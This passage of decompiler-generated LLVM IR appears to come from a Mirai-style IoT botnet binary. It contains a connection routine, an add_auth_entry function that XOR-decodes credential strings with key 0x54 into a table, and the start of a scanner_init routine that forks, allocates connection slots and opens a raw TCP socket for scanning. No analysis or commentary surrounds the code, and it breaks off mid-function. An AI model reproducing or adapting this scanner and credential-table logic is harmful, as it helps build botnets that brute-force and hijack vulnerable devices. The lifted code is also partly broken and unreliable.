  br i1 %v7_e30c, label %dec_label_pc_e31c, label %dec_label_pc_e2c4

dec_label_pc_e31c:                                ; preds = %dec_label_pc_e300
  store i32 %v5_e2f0, i32* %r3.global-to-local, align 4
  %v1_e32c = load i32, i32* %r6.global-to-local, align 4
  %v2_e32c = inttoptr i32 %v1_e32c to i32*
  store i32 %v0_e32c, i32* %v2_e32c, align 4
  %v0_e330 = load i32, i32* %r4.global-to-local, align 4
  %v1_e330 = load i32, i32* %r7.global-to-local, align 4
  %v2_e330 = inttoptr i32 %v1_e330 to i32*
  store i32 %v0_e330, i32* %v2_e330, align 4
  %v0_e334 = load i32, i32* %lr.global-to-local, align 4
  %v1_e334 = load i32, i32* %r8.global-to-local, align 4
  %v2_e334 = inttoptr i32 %v1_e334 to i32*
  store i32 %v0_e334, i32* %v2_e334, align 4
  %v0_e338 = load i32, i32* %r3.global-to-local, align 4
  %v1_e338 = load i32, i32* %sl.global-to-local, align 4
  %v2_e338 = inttoptr i32 %v1_e338 to i32*
  store i32 %v0_e338, i32* %v2_e338, align 4
  %v0_e33c = load i32, i32* %r3.global-to-local, align 4
  %v1_e33c = trunc i32 %v0_e33c to i8
  %v2_e33c = load i32, i32* %r5.global-to-local, align 4
  %v3_e33c = inttoptr i32 %v2_e33c to i8*
  store i8 %v1_e33c, i8* %v3_e33c, align 1
  br label %dec_label_pc_e340

dec_label_pc_e340:                                ; preds = %entry, %dec_label_pc_e348, %dec_label_pc_e31c
  %v2_e340 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_e340, i32* @r4, align 4
  %v1_e344 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_e344

dec_label_pc_e348:                                ; preds = %dec_label_pc_e2c8
  %v0_e348 = load i32, i32* %r3.global-to-local, align 4
  %v1_e348 = load i32, i32* %sl.global-to-local, align 4
  %v2_e348 = inttoptr i32 %v1_e348 to i32*
  store i32 %v0_e348, i32* %v2_e348, align 4
  %v0_e34c = load i32, i32* %lr.global-to-local, align 4
  %v1_e34c = load i32, i32* %r8.global-to-local, align 4
  %v2_e34c = inttoptr i32 %v1_e34c to i32*
  store i32 %v0_e34c, i32* %v2_e34c, align 4
  %v0_e350 = load i32, i32* %r4.global-to-local, align 4
  %v1_e350 = load i32, i32* %r7.global-to-local, align 4
  %v2_e350 = inttoptr i32 %v1_e350 to i32*
  store i32 %v0_e350, i32* %v2_e350, align 4
  %v0_e354 = load i32, i32* %r0.global-to-local, align 4
  %v1_e354 = load i32, i32* %r6.global-to-local, align 4
  %v2_e354 = inttoptr i32 %v1_e354 to i32*
  store i32 %v0_e354, i32* %v2_e354, align 4
  br label %dec_label_pc_e340

; uselistorder directives
  uselistorder i32 %v9_e2f8, { 1, 0 }
  uselistorder i32 %v12_e2f4, { 1, 0 }
  uselistorder i32 %v5_e2f0, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_e31c, { 1, 0 }
  uselistorder i32 %v0_e320, { 1, 0 }
  uselistorder i32 %v0_e30c, { 1, 0, 2 }
  uselistorder i32 %v0_e2c8, { 1, 0 }
  uselistorder i32 %v0_e290, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 4, 0, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 4, 0, 1, 2, 3, 6, 5 }
  uselistorder i32* %r1.global-to-local, { 3, 5, 4, 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 2, 5, 6, 0, 1 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* @global_var_21c20.119, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_21c20.119 to i32), { 1, 0, 2 }
  uselistorder i32* @global_var_21c24.123, { 2, 3, 6, 4, 1, 0, 5 }
  uselistorder i32* @global_var_21c28.125, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32* @global_var_21c2c.121, { 2, 3, 5, 1, 0, 4 }
  uselistorder label %dec_label_pc_e340, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e2e0, { 1, 0 }
}

define i32 @setup_connection() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_e36c = load i32, i32* @r4, align 4
  store i32 %v3_e36c, i32* %stack_var_-16, align 4
  %v6_e36c = load i32, i32* @r5, align 4
  %v9_e36c = load i32, i32* @r6, align 4
  %v12_e36c = load i32, i32* @lr, align 4
  %v0_e370 = load i32, i32* @r0, align 4
  store i32 %v0_e370, i32* @r5, align 4
  %v1_e374 = add i32 %v0_e370, 4
  %v2_e374 = inttoptr i32 %v1_e374 to i32*
  %v3_e374 = load i32, i32* %v2_e374, align 4
  store i32 %v3_e374, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 0, i32* %stack_var_-32, align 4
  store i32 58264, i32* @lr, align 4
  %v1_e394 = icmp ne i32 %v3_e374, -1
  call void @__pseudo_cond_branch(i1 %v1_e394, i32 ptrtoint (i32* @global_var_14260.112 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_e3a0 = load i32, i32* @r6, align 4
  store i32 %v0_e3a0, i32* %r2.global-to-local, align 4
  %v3_e3a4 = call i32 @socket(i32 2, i32 1, i32 %v0_e3a0)
  store i32 %v3_e3a4, i32* %r0.global-to-local, align 4
  %v7_e3a8 = icmp eq i32 %v3_e3a4, -1
  %v1_e3ac = load i32, i32* @r5, align 4
  %v2_e3ac = add i32 %v1_e3ac, 4
  %v3_e3ac = inttoptr i32 %v2_e3ac to i32*
  store i32 %v3_e3a4, i32* %v3_e3ac, align 4
  br i1 %v7_e3a8, label %entry.dec_label_pc_e424_crit_edge, label %dec_label_pc_e3b4

entry.dec_label_pc_e424_crit_edge:                ; preds = %entry
  %v1_e42c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e424

dec_label_pc_e3b4:                                ; preds = %entry
  %v2_e378 = ptrtoint i32* %stack_var_-32 to i32
  %v0_e3b4 = load i32, i32* @r5, align 4
  %v1_e3b4 = add i32 %v0_e3b4, 28
  store i32 %v1_e3b4, i32* @r0, align 4
  %v0_e3b8 = load i32, i32* @r6, align 4
  %v2_e3b8 = add i32 %v0_e3b4, 24
  %v3_e3b8 = inttoptr i32 %v2_e3b8 to i32*
  store i32 %v0_e3b8, i32* %v3_e3b8, align 4
  store i32 256, i32* @r1, align 4
  %v0_e3c0 = call i32 @util_zero()
  store i32 %v0_e3c0, i32* %r0.global-to-local, align 4
  %v0_e3c4 = load i32, i32* @r5, align 4
  %v1_e3c4 = add i32 %v0_e3c4, 4
  %v2_e3c4 = inttoptr i32 %v1_e3c4 to i32*
  %v3_e3c4 = load i32, i32* %v2_e3c4, align 4
  store i32 %v3_e3c4, i32* @r4, align 4
  %v0_e3c8 = load i32, i32* @r6, align 4
  store i32 %v0_e3c8, i32* @r2, align 4
  store i32 %v3_e3c4, i32* %r0.global-to-local, align 4
  %v2_e3d4 = call i32 @__libc_fcntl(i32 %v3_e3c4, i32 3)
  %v1_e3dc = or i32 %v2_e3d4, 2048
  store i32 %v1_e3dc, i32* @r2, align 4
  %v0_e3e0 = load i32, i32* @r4, align 4
  store i32 %v0_e3e0, i32* %r0.global-to-local, align 4
  %v2_e3e4 = call i32 @__libc_fcntl(i32 %v0_e3e0, i32 4)
  store i32 %v2_e3e4, i32* %r0.global-to-local, align 4
  %v2_e3ec = load i32, i32* @global_var_21c64.139, align 4
  store i32 %v2_e3ec, i32* %r2.global-to-local, align 4
  %v1_e3f4 = load i32, i32* @r5, align 4
  %v2_e3f4 = add i32 %v1_e3f4, 12
  %v3_e3f4 = inttoptr i32 %v2_e3f4 to i32*
  store i32 1, i32* %v3_e3f4, align 4
  store i32 2, i32* %stack_var_-32, align 4
  %v0_e400 = load i32, i32* %r2.global-to-local, align 4
  %v1_e400 = load i32, i32* @r5, align 4
  %v2_e400 = add i32 %v1_e400, 8
  %v3_e400 = inttoptr i32 %v2_e400 to i32*
  store i32 %v0_e400, i32* %v3_e400, align 4
  %v0_e404 = load i32, i32* @r5, align 4
  %v1_e408 = add i32 %v0_e404, 4
  %v2_e408 = inttoptr i32 %v1_e408 to i32*
  %v3_e408 = load i32, i32* %v2_e408, align 4
  store i32 %v3_e408, i32* %r0.global-to-local, align 4
  %v1_e40c = add i32 %v0_e404, 20
  %v2_e40c = inttoptr i32 %v1_e40c to i16*
  %v3_e40c = load i16, i16* %v2_e40c, align 2
  %v4_e40c = zext i16 %v3_e40c to i32
  store i32 %v4_e40c, i32* @r5, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_e420 = call i32 @__libc_connect(i32 %v3_e408, i32 %v2_e378, i32 16)
  store i32 %v3_e420, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e424

dec_label_pc_e424:                                ; preds = %entry.dec_label_pc_e424_crit_edge, %dec_label_pc_e3b4
  %v1_e42c = phi i32 [ %v1_e42c.pre, %entry.dec_label_pc_e424_crit_edge ], [ %v3_e420, %dec_label_pc_e3b4 ]
  %v2_e428 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_e428, i32* @r4, align 4
  store i32 %v6_e36c, i32* @r5, align 4
  store i32 %v9_e36c, i32* @r6, align 4
  store i32 %v12_e36c, i32* @lr, align 4
  ret i32 %v1_e42c

; uselistorder directives
  uselistorder i32 %v3_e3a4, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 3, 2, 4, 5, 8, 9, 7, 6 }
  uselistorder i32 ()* @util_zero, { 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_e424, { 1, 0 }
}

define i32 @add_auth_entry(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_e434 = load i32, i32* @r4, align 4
  %v6_e434 = load i32, i32* @r5, align 4
  %v9_e434 = load i32, i32* @r6, align 4
  %v12_e434 = load i32, i32* @r7, align 4
  %v15_e434 = load i32, i32* @r8, align 4
  %v18_e434 = load i32, i32* @sb, align 4
  %v21_e434 = load i32, i32* @sl, align 4
  %v24_e434 = load i32, i32* @fp, align 4
  store i32 ptrtoint (i32* @global_var_21c30.141 to i32), i32* @fp, align 4
  %v2_e43c = load i32, i32* @global_var_21c30.141, align 4
  store i32 ptrtoint (i32* @global_var_21c5c.143 to i32), i32* @sl, align 4
  %v1_e448 = add i32 %v2_e43c, 1
  store i32 %v1_e448, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_e454 = load i32, i32* @global_var_21c5c.143, align 4
  store i32 %v2_e454, i32* %r0.global-to-local, align 4
  %v3_e458 = mul i32 %v1_e448, 16
  store i32 %v3_e458, i32* %r1.global-to-local, align 4
  %v4_e460 = inttoptr i32 %v2_e454 to i32*
  %v5_e460 = call i32 @realloc(i32* %v4_e460, i32 %v3_e458, i32 %arg3, i32 %v1_e448)
  %v2_e464 = load i32, i32* @global_var_21c30.141, align 4
  store i32 %v2_e464, i32* %r2.global-to-local, align 4
  store i32 %v5_e460, i32* @r8, align 4
  %v0_e46c = load i32, i32* @r5, align 4
  store i32 %v0_e46c, i32* %r0.global-to-local, align 4
  %v1_e474 = load i32, i32* @sl, align 4
  %v2_e474 = inttoptr i32 %v1_e474 to i32*
  store i32 %v5_e460, i32* %v2_e474, align 4
  %v1_e478 = inttoptr i32 %v0_e46c to i8*
  %v2_e478 = call i32 @util_strlen(i8* %v1_e478)
  %sext = mul i32 %v2_e478, 16777216
  %v1_e47c = sdiv i32 %sext, 16777216
  %v2_e47c = add nsw i32 %v1_e47c, 1
  store i32 %v2_e47c, i32* @r4, align 4
  store i32 %v1_e47c, i32* @r7, align 4
  store i32 %v2_e47c, i32* @r0, align 4
  %v0_e488 = call i32 @malloc()
  store i32 %v0_e488, i32* %r0.global-to-local, align 4
  %v0_e48c = load i32, i32* @r5, align 4
  store i32 %v0_e48c, i32* %r1.global-to-local, align 4
  %v0_e490 = load i32, i32* @r4, align 4
  store i32 %v0_e490, i32* %r2.global-to-local, align 4
  store i32 %v0_e488, i32* %r6.global-to-local, align 4
  %v3_e498 = call i32 @util_memcpy(i32 %v0_e488, i32 %v0_e48c, i32 %v0_e490)
  store i32 %v3_e498, i32* %r0.global-to-local, align 4
  %v0_e49c = load i32, i32* @r7, align 4
  %tmp22 = icmp slt i32 %v0_e49c, 1
  %extract.t6 = trunc i32 %v0_e49c to i8
  br i1 %tmp22, label %dec_label_pc_e4c0, label %dec_label_pc_e4a4

dec_label_pc_e4a4:                                ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e4a8

dec_label_pc_e4a8:                                ; preds = %dec_label_pc_e4a8, %dec_label_pc_e4a4
  %v2_e4b0 = phi i32 [ %v1_e4b4, %dec_label_pc_e4a8 ], [ 0, %dec_label_pc_e4a4 ]
  %v1_e4a8 = load i32, i32* %r6.global-to-local, align 4
  %v2_e4a8 = add i32 %v1_e4a8, %v2_e4b0
  %v3_e4a8 = inttoptr i32 %v2_e4a8 to i8*
  %v4_e4a8 = load i8, i8* %v3_e4a8, align 1
  %v6_e4a8 = zext i8 %v4_e4a8 to i32
  %v1_e4ac = xor i32 %v6_e4a8, 84
  store i32 %v1_e4ac, i32* %r3.global-to-local, align 4
  %v1_e4b0 = trunc i32 %v1_e4ac to i8
  store i8 %v1_e4b0, i8* %v3_e4a8, align 1
  %v0_e4b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_e4b4 = add i32 %v0_e4b4, 1
  store i32 %v1_e4b4, i32* %r2.global-to-local, align 4
  %v1_e4b8 = load i32, i32* @r7, align 4
  %v9_e4b8 = icmp eq i32 %v1_e4b4, %v1_e4b8
  br i1 %v9_e4b8, label %dec_label_pc_e4c0.loopexit, label %dec_label_pc_e4a8

dec_label_pc_e4c0.loopexit:                       ; preds = %dec_label_pc_e4a8
  %extract.t = trunc i32 %v1_e4b4 to i8
  br label %dec_label_pc_e4c0

dec_label_pc_e4c0:                                ; preds = %dec_label_pc_e4c0.loopexit, %entry
  %v0_e4d0.off0 = phi i8 [ %extract.t, %dec_label_pc_e4c0.loopexit ], [ %extract.t6, %entry ]
  %v2_e4c0 = load i32, i32* @global_var_21c30.141, align 4
  %v2_e4c4 = load i32, i32* @global_var_21c5c.143, align 4
  %v3_e4c8 = mul i32 %v2_e4c0, 16
  store i32 %v3_e4c8, i32* @sb, align 4
  %v2_e4cc = add i32 %v2_e4c4, %v3_e4c8
  store i32 %v2_e4cc, i32* %r2.global-to-local, align 4
  %v3_e4d0 = add i32 %v2_e4cc, 12
  %v4_e4d0 = inttoptr i32 %v3_e4d0 to i8*
  store i8 %v0_e4d0.off0, i8* %v4_e4d0, align 1
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %v2_e464, i32* %r3.global-to-local, align 4
  %v0_e4dc = load i32, i32* %r6.global-to-local, align 4
  %v1_e4dc = load i32, i32* @r8, align 4
  %v5_e4dc = mul i32 %v2_e464, 16
  %v6_e4dc = add i32 %v1_e4dc, %v5_e4dc
  %v7_e4dc = inttoptr i32 %v6_e4dc to i32*
  store i32 %v0_e4dc, i32* %v7_e4dc, align 4
  %v2_e4e0 = load i32, i32* @global_var_21c5c.143, align 4
  store i32 %v2_e4e0, i32* @r7, align 4
  %v1_e4e4 = inttoptr i32 %arg2 to i8*
  %v2_e4e4 = call i32 @util_strlen(i8* %v1_e4e4)
  %sext1 = mul i32 %v2_e4e4, 16777216
  %v1_e4e8 = sdiv i32 %sext1, 16777216
  %v2_e4e8 = add nsw i32 %v1_e4e8, 1
  store i32 %v2_e4e8, i32* @r4, align 4
  store i32 %v1_e4e8, i32* @r6, align 4
  store i32 %v2_e4e8, i32* @r0, align 4
  %v0_e4f4 = call i32 @malloc()
  store i32 %v0_e4f4, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v0_e4fc = load i32, i32* @r4, align 4
  store i32 %v0_e4fc, i32* %r2.global-to-local, align 4
  store i32 %v0_e4f4, i32* %r5.global-to-local, align 4
  %v3_e504 = call i32 @util_memcpy(i32 %v0_e4f4, i32 %arg2, i32 %v0_e4fc)
  store i32 %v3_e504, i32* %r0.global-to-local, align 4
  %v0_e508 = load i32, i32* @r6, align 4
  %tmp23 = icmp slt i32 %v0_e508, 1
  %extract.t8 = trunc i32 %v0_e508 to i8
  br i1 %tmp23, label %dec_label_pc_e52c, label %dec_label_pc_e510

dec_label_pc_e510:                                ; preds = %dec_label_pc_e4c0
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e514

dec_label_pc_e514:                                ; preds = %dec_label_pc_e514, %dec_label_pc_e510
  %v2_e51c = phi i32 [ %v1_e520, %dec_label_pc_e514 ], [ 0, %dec_label_pc_e510 ]
  %v1_e514 = load i32, i32* %r5.global-to-local, align 4
  %v2_e514 = add i32 %v1_e514, %v2_e51c
  %v3_e514 = inttoptr i32 %v2_e514 to i8*
  %v4_e514 = load i8, i8* %v3_e514, align 1
  %v6_e514 = zext i8 %v4_e514 to i32
  %v1_e518 = xor i32 %v6_e514, 84
  store i32 %v1_e518, i32* %r3.global-to-local, align 4
  %v1_e51c = trunc i32 %v1_e518 to i8
  store i8 %v1_e51c, i8* %v3_e514, align 1
  %v0_e520 = load i32, i32* %r2.global-to-local, align 4
  %v1_e520 = add i32 %v0_e520, 1
  store i32 %v1_e520, i32* %r2.global-to-local, align 4
  %v1_e524 = load i32, i32* @r6, align 4
  %v9_e524 = icmp eq i32 %v1_e520, %v1_e524
  br i1 %v9_e524, label %dec_label_pc_e52c.loopexit, label %dec_label_pc_e514

dec_label_pc_e52c.loopexit:                       ; preds = %dec_label_pc_e514
  %extract.t7 = trunc i32 %v1_e520 to i8
  br label %dec_label_pc_e52c

dec_label_pc_e52c:                                ; preds = %dec_label_pc_e52c.loopexit, %dec_label_pc_e4c0
  %v0_e53c.off0 = phi i8 [ %extract.t7, %dec_label_pc_e52c.loopexit ], [ %extract.t8, %dec_label_pc_e4c0 ]
  %v2_e52c = load i32, i32* @global_var_21c30.141, align 4
  store i32 %v2_e52c, i32* %r0.global-to-local, align 4
  %v2_e530 = load i32, i32* @global_var_21c5c.143, align 4
  %v3_e534 = mul i32 %v2_e52c, 16
  store i32 %v3_e534, i32* %r1.global-to-local, align 4
  %v2_e538 = or i32 %v3_e534, 13
  %v3_e53c = add i32 %v2_e538, %v2_e530
  %v4_e53c = inttoptr i32 %v3_e53c to i8*
  store i8 %v0_e53c.off0, i8* %v4_e53c, align 1
  store i32 ptrtoint (i16** @global_var_21c60.145 to i32), i32* %r4.global-to-local, align 4
  %v2_e548 = load i16, i16* bitcast (i16** @global_var_21c60.145 to i16*), align 4
  %v3_e548 = zext i16 %v2_e548 to i32
  store i32 %v3_e548, i32* %lr.global-to-local, align 4
  %v2_e550 = load i32, i32* @global_var_21c5c.143, align 4
  store i32 %v2_e550, i32* %r2.global-to-local, align 4
  %v0_e558 = load i32, i32* %r1.global-to-local, align 4
  %v2_e558 = add i32 %v0_e558, %v2_e550
  store i32 %v2_e558, i32* %r1.global-to-local, align 4
  store i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_21c60.145 to i32), i32 16), i32 16), i32* %r3.global-to-local, align 4
  %v0_e560 = load i32, i32* @sb, align 4
  %v1_e560 = load i32, i32* @r7, align 4
  %v2_e560 = add i32 %v1_e560, %v0_e560
  store i32 %v2_e560, i32* %ip.global-to-local, align 4
  %v0_e564 = load i32, i32* %r0.global-to-local, align 4
  %v1_e564 = add i32 %v0_e564, 1
  store i32 %v1_e564, i32* %r0.global-to-local, align 4
  %v3_e568 = add i32 %v2_e558, 10
  %v4_e568 = inttoptr i32 %v3_e568 to i16*
  store i16 trunc (i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_21c60.145 to i32), i32 16), i32 16) to i16), i16* %v4_e568, align 2
  %v0_e56c = load i32, i32* %lr.global-to-local, align 4
  %v1_e56c = trunc i32 %v0_e56c to i16
  %v2_e56c = load i32, i32* %r1.global-to-local, align 4
  %v3_e56c = add i32 %v2_e56c, 8
  %v4_e56c = inttoptr i32 %v3_e56c to i16*
  store i16 %v1_e56c, i16* %v4_e56c, align 2
  %v0_e570 = load i32, i32* %r5.global-to-local, align 4
  %v1_e570 = load i32, i32* %ip.global-to-local, align 4
  %v2_e570 = add i32 %v1_e570, 4
  %v3_e570 = inttoptr i32 %v2_e570 to i32*
  store i32 %v0_e570, i32* %v3_e570, align 4
  %v1_e574 = load i32, i32* @fp, align 4
  %v2_e574 = inttoptr i32 %v1_e574 to i32*
  store i32 %v1_e564, i32* %v2_e574, align 4
  %v0_e578 = load i32, i32* %r3.global-to-local, align 4
  %v1_e578 = trunc i32 %v0_e578 to i16
  %v2_e578 = load i32, i32* %r4.global-to-local, align 4
  %v3_e578 = inttoptr i32 %v2_e578 to i16*
  store i16 %v1_e578, i16* %v3_e578, align 2
  store i32 %v3_e434, i32* @r4, align 4
  store i32 %v6_e434, i32* @r5, align 4
  store i32 %v9_e434, i32* @r6, align 4
  store i32 %v12_e434, i32* @r7, align 4
  store i32 %v15_e434, i32* @r8, align 4
  store i32 %v18_e434, i32* @sb, align 4
  store i32 %v21_e434, i32* @sl, align 4
  store i32 %v24_e434, i32* @fp, align 4
  ret i32 %v1_e564

; uselistorder directives
  uselistorder i32 %v3_e534, { 1, 0 }
  uselistorder i32 %v1_e520, { 0, 2, 3, 1 }
  uselistorder i32 %v0_e4f4, { 1, 0, 2 }
  uselistorder i32 %v3_e4c8, { 1, 0 }
  uselistorder i32 %v1_e4b4, { 0, 2, 3, 1 }
  uselistorder i32 %v0_e488, { 1, 0, 2 }
  uselistorder i32 %v2_e464, { 1, 0, 2 }
  uselistorder i32 %v3_e458, { 1, 0 }
  uselistorder i32 %v1_e448, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 (i8*)* @util_strlen, { 0, 1, 22, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
}

define i32 @scanner_init(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp334 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-45 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-1866 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i8, align 1
  %v6_e594 = load i32, i32* @r5, align 4
  %v18_e594 = load i32, i32* @sb, align 4
  %v21_e594 = load i32, i32* @sl, align 4
  %v24_e594 = load i32, i32* @fp, align 4
  %v0_e5a0 = call i32 @__libc_fork()
  store i32 %v0_e5a0, i32* %r0.global-to-local, align 4
  %v7_e5a4 = icmp eq i32 %v0_e5a0, -1
  %. = zext i1 %v7_e5a4 to i32
  %tmp369 = icmp slt i32 %v0_e5a0, 1
  %storemerge329 = select i1 %tmp369, i32 %., i32 1
  store i32 %storemerge329, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_24750.147 to i32), i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e5c0 = icmp eq i32 %storemerge329, 0
  store i1 %v2_e5c0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_e5a0, i32* @global_var_24750.147, align 4
  br i1 %v2_e5c0, label %dec_label_pc_e5dc, label %dec_label_pc_e5cc

dec_label_pc_e5cc:                                ; preds = %entry
  store i32 %v6_e594, i32* @r5, align 4
  store i32 %v18_e594, i32* @sb, align 4
  store i32 %v21_e594, i32* @sl, align 4
  store i32 %v24_e594, i32* @fp, align 4
  ret i32 %v0_e5a0

dec_label_pc_e5dc:                                ; preds = %entry
  %v0_e5dc = call i32 @util_local_addr()
  store i32 %v0_e5dc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2472c.58 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_e5dc, i32* @global_var_2472c.58, align 4
  %v1_e5e8 = call i32 @rand_init(i32 %v0_e5dc)
  %v0_e5ec = load i32, i32* @r4, align 4
  store i32 %v0_e5ec, i32* %r0.global-to-local, align 4
  %v1_e5f0 = inttoptr i32 %v0_e5ec to i32*
  %v2_e5f0 = call i32 @__GI_time(i32* %v1_e5f0)
  store i32 ptrtoint (i32* @global_var_21c64.139 to i32), i32* %r2.global-to-local, align 4
  store i32 288, i32* %r1.global-to-local, align 4
  store i32 %v2_e5f0, i32* @global_var_21c64.139, align 4
  store i32 256, i32* %r0.global-to-local, align 4
  %v2_e604 = call i32 @calloc(i32 256, i32 288)
  store i32 ptrtoint (i32* @global_var_24748.151 to i32), i32* %r3.global-to-local, align 4
  %v0_e60c = load i32, i32* @r4, align 4
  store i32 %v0_e60c, i32* %stack_var_-52, align 4
  store i32 %v2_e604, i32* @global_var_24748.151, align 4
  store i32 %v0_e60c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e618

dec_label_pc_e618:                                ; preds = %dec_label_pc_e618.dec_label_pc_e618_crit_edge, %dec_label_pc_e5dc
  %v2_e624 = phi i32 [ %v2_e624.pre, %dec_label_pc_e618.dec_label_pc_e618_crit_edge ], [ %v2_e604, %dec_label_pc_e5dc ]
  %v0_e62c = phi i32 [ %v0_e65c, %dec_label_pc_e618.dec_label_pc_e618_crit_edge ], [ %v0_e60c, %dec_label_pc_e5dc ]
  %v3_e620 = mul i32 %v0_e62c, 256
  store i32 %v3_e620, i32* %ip.global-to-local, align 4
  store i32 %v2_e624, i32* @lr, align 4
  %v2_e634 = mul i32 %v0_e62c, 288
  %v1_e63c = add i32 %v0_e62c, 1
  store i32 %v1_e63c, i32* %r0.global-to-local, align 4
  %v2_e640 = add i32 %v2_e634, %v2_e624
  store i32 %v2_e640, i32* %r2.global-to-local, align 4
  store i32 %v2_e640, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* @r3, align 4
  %v2_e654 = add i32 %v2_e640, 4
  %v3_e654 = inttoptr i32 %v2_e654 to i32*
  store i32 -1, i32* %v3_e654, align 4
  %v0_e658 = load i32, i32* @r5, align 4
  %v1_e658 = load i32, i32* %r1.global-to-local, align 4
  %v2_e658 = add i32 %v1_e658, 12
  %v3_e658 = inttoptr i32 %v2_e658 to i32*
  store i32 %v0_e658, i32* %v3_e658, align 4
  %v0_e65c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e65c, i32* %stack_var_-52, align 4
  %v7_e660 = icmp sgt i32 %v1_e63c, 255
  br i1 %v7_e660, label %dec_label_pc_e664, label %dec_label_pc_e618.dec_label_pc_e618_crit_edge

dec_label_pc_e618.dec_label_pc_e618_crit_edge:    ; preds = %dec_label_pc_e618
  %v2_e624.pre = load i32, i32* @global_var_24748.151, align 4
  br label %dec_label_pc_e618

dec_label_pc_e664:                                ; preds = %dec_label_pc_e618
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v3_e670 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_e670, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2474c.153 to i32), i32* %r2.global-to-local, align 4
  %v2_e678 = icmp eq i32 %v3_e670, -1
  store i1 %v2_e678, i1* %cpsr_c.global-to-local, align 1
  %v7_e678 = icmp eq i32 %v3_e670, -1
  store i1 %v7_e678, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_e670, i32* @r4, align 4
  store i32 %v3_e670, i32* @global_var_2474c.153, align 4
  br i1 %v7_e678, label %dec_label_pc_e664.dec_label_pc_fc38_crit_edge, label %dec_label_pc_e688

dec_label_pc_e664.dec_label_pc_fc38_crit_edge:    ; preds = %dec_label_pc_e664
  %.pre283 = ptrtoint i8* %stack_var_-56 to i32
  br label %dec_label_pc_fc38

